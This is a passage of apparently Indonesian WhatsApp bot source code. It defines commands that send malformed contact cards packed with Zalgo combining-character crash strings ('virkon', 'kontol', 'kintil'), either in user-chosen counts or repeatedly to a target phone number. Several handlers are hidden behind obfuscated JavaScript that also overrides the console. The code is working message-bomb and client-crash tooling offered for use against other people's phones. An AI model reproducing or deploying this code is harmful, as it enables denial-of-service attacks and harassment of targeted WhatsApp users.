́͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285714170944\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD",
"jpegThumbnail": virgam,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}}), { userJid: m.chat, quoted: fkontaak })
ikycoli.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
jancok(`Sukses Send Virkon Sebanyak ${jumlah}`)
}
break
 case 'jadivirkon':{
var _0x4cc189=_0x464c;function _0x464c(_0x28a488,_0x317bdb){var _0x3c92a7=_0xe7b1();return _0x464c=function(_0x1b80f3,_0x4c301b){_0x1b80f3=_0x1b80f3-0x10e;var _0x2c3ba1=_0x3c92a7[_0x1b80f3];return _0x2c3ba1;},_0x464c(_0x28a488,_0x317bdb);}(function(_0x44b07c,_0x1a16c7){var _0xd8ec68=_0x464c,_0x3d70a7=_0x44b07c();while(!![]){try{var _0x298cc5=-parseInt(_0xd8ec68(0x111))/0x1*(-parseInt(_0xd8ec68(0x11f))/0x2)+-parseInt(_0xd8ec68(0x119))/0x3*(parseInt(_0xd8ec68(0x10e))/0x4)+-parseInt(_0xd8ec68(0x118))/0x5*(-parseInt(_0xd8ec68(0x117))/0x6)+-parseInt(_0xd8ec68(0x113))/0x7+-parseInt(_0xd8ec68(0x114))/0x8*(parseInt(_0xd8ec68(0x127))/0x9)+-parseInt(_0xd8ec68(0x11d))/0xa+parseInt(_0xd8ec68(0x126))/0xb;if(_0x298cc5===_0x1a16c7)break;else _0x3d70a7['push'](_0x3d70a7['shift']());}catch(_0x3ee580){_0x3d70a7['push'](_0x3d70a7['shift']());}}}(_0xe7b1,0x72e00));var _0x7a69df=(function(){var _0x24b5ae=!![];return function(_0x29e6b7,_0x5b343d){var _0x1a9576=_0x24b5ae?function(){if(_0x5b343d){var _0x5d1ed9=_0x5b343d['apply'](_0x29e6b7,arguments);return _0x5b343d=null,_0x5d1ed9;}}:function(){};return _0x24b5ae=![],_0x1a9576;};}()),_0xbde16a=_0x7a69df(this,function(){var _0x4db14b=_0x464c;return _0xbde16a[_0x4db14b(0x123)]()[_0x4db14b(0x112)](_0x4db14b(0x12d))[_0x4db14b(0x123)]()[_0x4db14b(0x120)](_0xbde16a)['search'](_0x4db14b(0x12d));});_0xbde16a();function _0xe7b1(){var _0xa41e81=['3ItvUQC','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;`${viruskon}`\x0aORG:\x0aTITLE:`${virusv3}`\x0aitem1.TEL:+6285714170944\x0aitem1.X-ABLabel:Celular\x0aitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\x0aitem2.X-ABLabel:INTERNET\x0aitem3.ADR:;;Casa\x20do\x20karalho;;;;\x0aitem3.X-ABADR:ac\x0aitem3.X-ABLabel:Casa\x0aitem4.ADR:;;EMAIL\x5c;CHARSET=UTF-8\x5c;type=HOME\x5c,INTERNET\x5c;ac;\x0aitem4.X-ABADR:\x0aitem4.X-ABLabel:Casa\x0aEND:VCARD','bind','__proto__','5714920nLNDMa','Sukses\x20Convert\x20Virkon','170wraEBl','constructor','key','log','toString','fromObject','apply','20788427oRjVrG','18uDtpXl','console','table','{}.constructor(\x22return\x20this\x22)(\x20)','chat','Message','(((.+)+)+)+$','info','waUploadToServer','relayMessage','2140876CkKiPO','error','return\x20(function()\x20','3309PHPpbf','search','3369695MkLzlA','1375472ddCOgs','readFileSync','length','81660dPZWvO','85KLLFey'];_0xe7b1=function(){return _0xa41e81;};return _0xe7b1();}var _0x4c301b=(function(){var _0x228485=!![];return function(_0x5d4b0c,_0x59aa09){var _0x1e309a=_0x228485?function(){var _0x485994=_0x464c;if(_0x59aa09){var _0x3618b1=_0x59aa09[_0x485994(0x125)](_0x5d4b0c,arguments);return _0x59aa09=null,_0x3618b1;}}:function(){};return _0x228485=![],_0x1e309a;};}()),_0x1b80f3=_0x4c301b(this,function(){var _0xbff1e9=_0x464c,_0x40d451;try{var _0x24de5e=Function(_0xbff1e9(0x110)+_0xbff1e9(0x12a)+');');_0x40d451=_0x24de5e();}catch(_0x471551){_0x40d451=window;}var _0x18fb02=_0x40d451[_0xbff1e9(0x128)]=_0x40d451[_0xbff1e9(0x128)]||{},_0x3c4f7b=[_0xbff1e9(0x122),'warn',_0xbff1e9(0x12e),_0xbff1e9(0x10f),'exception',_0xbff1e9(0x129),'trace'];for(var _0x560c3a=0x0;_0x560c3a<_0x3c4f7b[_0xbff1e9(0x116)];_0x560c3a++){var _0x357b05=_0x4c301b[_0xbff1e9(0x120)]['prototype'][_0xbff1e9(0x11b)](_0x4c301b),_0x5f50fc=_0x3c4f7b[_0x560c3a],_0x377d09=_0x18fb02[_0x5f50fc]||_0x357b05;_0x357b05[_0xbff1e9(0x11c)]=_0x4c301b[_0xbff1e9(0x11b)](_0x4c301b),_0x357b05[_0xbff1e9(0x123)]=_0x377d09['toString']['bind'](_0x377d09),_0x18fb02[_0x5f50fc]=_0x357b05;}});_0x1b80f3();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw'Teks/Reply';var messa=await prepareWAMessageMedia({'image':fs[_0x4cc189(0x115)]('./pict.jpg')},{'upload':ikycoli[_0x4cc189(0x12f)]}),contact=generateWAMessageFromContent(m[_0x4cc189(0x12b)],proto[_0x4cc189(0x12c)][_0x4cc189(0x124)]({'contactMessage':{'displayName':text+'\x20'+viruskon,'vcard':_0x4cc189(0x11a),'jpegThumbnail':virgam,'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}}),{'userJid':m[_0x4cc189(0x12b)],'quoted':fkntliky});ikycoli[_0x4cc189(0x130)](m['chat'],contact['message'],{'messageId':contact[_0x4cc189(0x121)]['id']}),jancok(_0x4cc189(0x11e));}
}
break
case 'kontol': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
ikycoli.sendContact(m.chat, global.premium, fkontaak)
}
jancok(`Sukses Send Kontol Sebanyak ${jumlah}`)
}
break
case 'ikykontolprivate': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`	
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
m.reply(`Sukses Send Kontol Di Nomer ${text}`)
}
break
case 'ikygaskenkontol': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
m.reply(`Sukses Send Kontol Di Nomer ${text}`)
}
break
case 'jadikontol':{
var _0x4f7db0=_0x2c70;(function(_0x45f87d,_0x5415f2){var _0x4a3754=_0x2c70,_0x2b1a6e=_0x45f87d();while(!![]){try{var _0x3cf043=parseInt(_0x4a3754(0x18f))/0x1*(-parseInt(_0x4a3754(0x195))/0x2)+parseInt(_0x4a3754(0x199))/0x3*(-parseInt(_0x4a3754(0x1a5))/0x4)+-parseInt(_0x4a3754(0x1a6))/0x5+parseInt(_0x4a3754(0x19c))/0x6+parseInt(_0x4a3754(0x19a))/0x7+-parseInt(_0x4a3754(0x1a3))/0x8+parseInt(_0x4a3754(0x198))/0x9;if(_0x3cf043===_0x5415f2)break;else _0x2b1a6e['push'](_0x2b1a6e['shift']());}catch(_0x30602e){_0x2b1a6e['push'](_0x2b1a6e['shift']());}}}(_0xbed1,0x5132a));var _0x52f5fb=(function(){var _0x12a67e=!![];return function(_0x375cad,_0x4d0041){var _0x37f2c8=_0x12a67e?function(){var _0x136c68=_0x2c70;if(_0x4d0041){var _0x7e8673=_0x4d0041[_0x136c68(0x1a8)](_0x375cad,arguments);return _0x4d0041=null,_0x7e8673;}}:function(){};return _0x12a67e=![],_0x37f2c8;};}()),_0x199966=_0x52f5fb(this,function(){var _0x434a53=_0x2c70;return _0x199966[_0x434a53(0x19d)]()[_0x434a53(0x194)]('(((.+)+)+)+$')[_0x434a53(0x19d)]()[_0x434a53(0x19e)](_0x199966)[_0x434a53(0x194)](_0x434a53(0x1a2));});function _0x2c70(_0x53aeb6,_0x4526ab){var _0x85310=_0xbed1();return _0x2c70=function(_0x5203f7,_0x26ef84){_0x5203f7=_0x5203f7-0x18d;var _0x483e50=_0x85310[_0x5203f7];return _0x483e50;},_0x2c70(_0x53aeb6,_0x4526ab);}_0x199966();function _0xbed1(){var _0x5cfdda=['warn','apply','sendContact','error','chat','27286DycIfw','exception','premium','log','quoted','search','22HQMZba','Teks/Reply','trace','6493050FKlevy','1266021RksYrJ','2120069ttzYmk','bind','2000646vHMguV','toString','constructor','console','prototype','return\x20(function()\x20','(((.+)+)+)+$','1840112ANudbe','length','4YzxOQY','365025eKuIsG'];_0xbed1=function(){return _0x5cfdda;};return _0xbed1();}var _0x26ef84=(function(){var _0x6ef6c1=!![];return function(_0x1bd526,_0x315086){var _0x1a33bd=_0x6ef6c1?function(){if(_0x315086){var _0x1c44f8=_0x315086['apply'](_0x1bd526,arguments);return _0x315086=null,_0x1c44f8;}}:function(){};return _0x6ef6c1=![],_0x1a33bd;};}()),_0x5203f7=_0x26ef84(this,function(){var _0x469715=_0x2c70,_0x49f484=function(){var _0x5f4214=_0x2c70,_0x2fe366;try{_0x2fe366=Function(_0x5f4214(0x1a1)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x19852f){_0x2fe366=window;}return _0x2fe366;},_0x428644=_0x49f484(),_0x15110f=_0x428644['console']=_0x428644[_0x469715(0x19f)]||{},_0x576169=[_0x469715(0x192),_0x469715(0x1a7),'info',_0x469715(0x18d),_0x469715(0x190),'table',_0x469715(0x197)];for(var _0x4662b9=0x0;_0x4662b9<_0x576169[_0x469715(0x1a4)];_0x4662b9++){var _0x51ada6=_0x26ef84[_0x469715(0x19e)][_0x469715(0x1a0)][_0x469715(0x19b)](_0x26ef84),_0x4a8e4b=_0x576169[_0x4662b9],_0xd636ea=_0x15110f[_0x4a8e4b]||_0x51ada6;_0x51ada6['__proto__']=_0x26ef84[_0x469715(0x19b)](_0x26ef84),_0x51ada6[_0x469715(0x19d)]=_0xd636ea['toString']['bind'](_0xd636ea),_0x15110f[_0x4a8e4b]=_0x51ada6;}});_0x5203f7();{if(!isCreator&&!isBan)return;if(!m[_0x4f7db0(0x193)]&&!text)throw _0x4f7db0(0x196);ikycoli[_0x4f7db0(0x1a9)](m[_0x4f7db0(0x18e)],global[_0x4f7db0(0x191)],fkntliky),jancok('Sukses\x20Convert\x20Kontol');}
}
break

case 'kintil': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
ikycoli.sendContact(m.chat, global.premium, fkontaak)
}
jancok(`Sukses Send Kintil Sebanyak ${jumlah}`)
}
break
case 'jadikintil':{
var _0x4c7106=_0x87d3;function _0x349b(){var _0x411cbd=['3657372Qdunfa','error','11gZTIow','search','10597168ZGWEGl','684CWeUCt','5322050ckTsvY','__proto__','(((.+)+)+)+$','1146XHjkll','apply','premium','table','toString','2FnUzKn','bind','126153ovuwKU','info','prototype','exception','{}.constructor(\x22return\x20this\x22)(\x20)','48714hSEyIt','sendContact','console','return\x20(function()\x20','860qzlKTs','trace','24306FfKTPQ','52843QTvrJZ','chat','constructor'];_0x349b=function(){return _0x411cbd;};return _0x349b();}(function(_0x3b3f01,_0x4e1be8){var _0x2f9339=_0x87d3,_0x5e4a44=_0x3b3f01();while(!![]){try{var _0xa3a97e=-parseInt(_0x2f9339(0x186))/0x1*(parseInt(_0x2f9339(0x18d))/0x2)+-parseInt(_0x2f9339(0x193))/0x3*(-parseInt(_0x2f9339(0x19c))/0x4)+parseInt(_0x2f9339(0x19d))/0x5+-parseInt(_0x2f9339(0x1a0))/0x6*(parseInt(_0x2f9339(0x194))/0x7)+parseInt(_0x2f9339(0x19b))/0x8+-parseInt(_0x2f9339(0x188))/0x9*(parseInt(_0x2f9339(0x191))/0xa)+-parseInt(_0x2f9339(0x199))/0xb*(parseInt(_0x2f9339(0x197))/0xc);if(_0xa3a97e===_0x4e1be8)break;else _0x5e4a44['push'](_0x5e4a44['shift']());}catch(_0x4c7c97){_0x5e4a44['push'](_0x5e4a44['shift']());}}}(_0x349b,0xbce32));var _0x1adf7f=(function(){var _0x349b18=!![];return function(_0x16c82d,_0x5630c9){var _0x242b1d=_0x349b18?function(){var _0x22f662=_0x87d3;if(_0x5630c9){var _0x25a596=_0x5630c9[_0x22f662(0x182)](_0x16c82d,arguments);return _0x5630c9=null,_0x25a596;}}:function(){};return _0x349b18=![],_0x242b1d;};}()),_0x37224c=_0x1adf7f(this,function(){var _0xf3005b=_0x87d3;return _0x37224c[_0xf3005b(0x185)]()[_0xf3005b(0x19a)]('(((.+)+)+)+$')[_0xf3005b(0x185)]()[_0xf3005b(0x196)](_0x37224c)[_0xf3005b(0x19a)](_0xf3005b(0x19f));});function _0x87d3(_0x9a37b7,_0x37d928){var _0xaca38b=_0x349b();return _0x87d3=function(_0x39befd,_0x43854b){_0x39befd=_0x39befd-0x182;var _0x9c2164=_0xaca38b[_0x39befd];return _0x9c2164;},_0x87d3(_0x9a37b7,_0x37d928);}_0x37224c();var _0x43854b=(function(){var _0x163623=!![];return function(_0x4e9bae,_0x547be3){var _0x56848c=_0x163623?function(){var _0xf01239=_0x87d3;if(_0x547be3){var _0xe9434=_0x547be3[_0xf01239(0x182)](_0x4e9bae,arguments);return _0x547be3=null,_0xe9434;}}:function(){};return _0x163623=![],_0x56848c;};}()),_0x39befd=_0x43854b(this,function(){var _0x1e7c9e=_0x87d3,_0x1c375a;try{var _0x5266a5=Function(_0x1e7c9e(0x190)+_0x1e7c9e(0x18c)+');');_0x1c375a=_0x5266a5();}catch(_0xe1c432){_0x1c375a=window;}var _0x336720=_0x1c375a['console']=_0x1c375a[_0x1e7c9e(0x18f)]||{},_0x399e25=['log','warn',_0x1e7c9e(0x189),_0x1e7c9e(0x198),_0x1e7c9e(0x18b),_0x1e7c9e(0x184),_0x1e7c9e(0x192)];for(var _0x4128ce=0x0;_0x4128ce<_0x399e25['length'];_0x4128ce++){var _0x348bd3=_0x43854b['constructor'][_0x1e7c9e(0x18a)][_0x1e7c9e(0x187)](_0x43854b),_0x10fc44=_0x399e25[_0x4128ce],_0x4ee79a=_0x336720[_0x10fc44]||_0x348bd3;_0x348bd3[_0x1e7c9e(0x19e)]=_0x43854b['bind'](_0x43854b),_0x348bd3[_0x1e7c9e(0x185)]=_0x4ee79a[_0x1e7c9e(0x185)]['bind'](_0x4ee79a),_0x336720[_0x10fc44]=_0x348bd3;}});_0x39befd();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw'Teks/Reply';ikycoli[_0x4c7106(0x18e)](m[_0x4c7106(0x195)],global[_0x4c7106(0x183)],fkntliky),jancok('Sukses\x20Convert\x20Kintil');}
}
break
case 'ikykintilprivate': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
m.reply(`Sukses Send Kintil Di Nomer ${text}`)
}
break
case 'ikygaskenkintil': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
ikycoli.sendContact(m.chat, global.premium, fkontaak)
m.reply(`Sukses Send Kintil Di Nomer ${text}`)
}
break
case 'ikydocnopayment':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
